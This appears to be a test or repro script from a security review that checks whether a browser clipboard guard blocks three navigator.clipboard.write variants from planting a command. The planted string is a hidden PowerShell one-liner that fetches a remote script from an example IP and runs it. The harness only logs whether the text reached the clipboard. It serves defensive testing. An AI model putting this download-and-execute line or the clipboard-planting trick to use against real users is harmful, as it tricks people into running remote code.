import { start } from "docs/review-2026-11-16/repros/guards-lens/harness.mjs";
const CMD = "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1')\"";
const { ctx, base, close } = await start({ "/": `<body><button id=b>go</button><script>window.CMD=${JSON.stringify(CMD)}</script>` });
const page = await ctx.newPage();
page.on("console", (m) => { if (!m.text().includes("404")) console.log("   console:", m.text()); });
await page.goto(base + "/");
await page.waitForTimeout(500);
for (const [name, fn] of [
  ["write(): ClipboardItem with Promise<string>", `() => navigator.clipboard.write([new ClipboardItem({'text/plain': Promise.resolve(CMD)})]).catch(e=>console.log('rej', e.name))`],
  ["write(): ClipboardItem with string value", `() => navigator.clipboard.write([new ClipboardItem({'text/plain': CMD})]).catch(e=>console.log('rej', e.name))`],
  ["write(): delayed Promise<Blob> (resolves 200 ms later)", `() => navigator.clipboard.write([new ClipboardItem({'text/plain': new Promise(r=>setTimeout(()=>r(new Blob([CMD],{type:'text/plain'})),200))})]).catch(e=>console.log('rej', e.name))`],
]) {
  await page.evaluate(() => navigator.clipboard.writeText("clean"));
  await page.evaluate(`document.getElementById('b').onclick = ${fn}; 0`);
  await page.click("#b");
  await page.waitForTimeout(800);
  const got = await page.evaluate(() => navigator.clipboard.readText());
  console.log(name.padEnd(60), got.includes("powershell") ? "COMMAND ON CLIPBOARD" : "no command: " + JSON.stringify(got));
}
await close();
